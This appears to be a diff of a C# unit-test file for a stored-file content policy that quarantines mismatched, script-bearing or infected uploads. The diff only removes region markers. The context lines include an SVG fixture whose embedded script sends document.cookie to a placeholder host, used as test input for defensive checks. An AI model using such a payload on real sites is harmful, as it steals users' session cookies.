@@ -20,8 +20,6 @@ public sealed class StoredFileContentPolicyTests
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\">" +
         "<script>fetch('https://example.invalid/'+document.cookie)</script></svg>");
 
-    #region The declared type against the content
-
     [Theory]
     [InlineData("image/png")]
     [InlineData("image/jpeg")]
@@ -56,10 +54,6 @@ public sealed class StoredFileContentPolicyTests
     [Fact]
     public void ANonCanonicalSpellingOfARecognisedType_IsRefused() =>
         Decide("image/jpg", _jpeg).ShouldBe(ContentDecision.Quarantine);
-
-    #endregion
-
-    #region Script containers
 
     [Fact]
     public void AnSvgDeclaredAsAnImage_IsQuarantined() =>
@@ -132,10 +126,6 @@ public sealed class StoredFileContentPolicyTests
         Decide("text/plain", Encoding.ASCII.GetBytes("Dear Sir, please find the invoice attached."))
             .ShouldBe(ContentDecision.Release);
 
-    #endregion
-
-    #region The scanner's verdict
-
     [Fact]
     public void InfectedContent_IsQuarantined() =>
         StoredFileContentPolicy.Decide(
@@ -172,10 +162,6 @@ public sealed class StoredFileContentPolicyTests
                 verifySignature: true)
             .ShouldNotBe(ContentDecision.Quarantine);
 
-    #endregion
-
-    #region Per-category switches
-
     [Fact]
     public void WithoutSignatureVerification_AMismatchedHeadIsReleased() =>
         Decide("image/png", _jpeg, verifySignature: false).ShouldBe(ContentDecision.Release);
@@ -202,16 +188,10 @@ public sealed class StoredFileContentPolicyTests
         Decide("image/png", _png, verifySignature: false, scan: FileScanOutcome.Infected("Eicar-Test-Signature"))
             .ShouldBe(ContentDecision.Quarantine);
 
-    #endregion
-
-    #region Arguments
-
     [Fact]
     public void ANullDeclaredType_IsRejected() =>
         Should.Throw<ArgumentNullException>(
             () => StoredFileContentPolicy.Decide(null!, FileScanOutcome.Clean, _png, verifySignature: true));
-
-    #endregion
 
     private static ContentDecision Decide(
         string declaredMediaType,
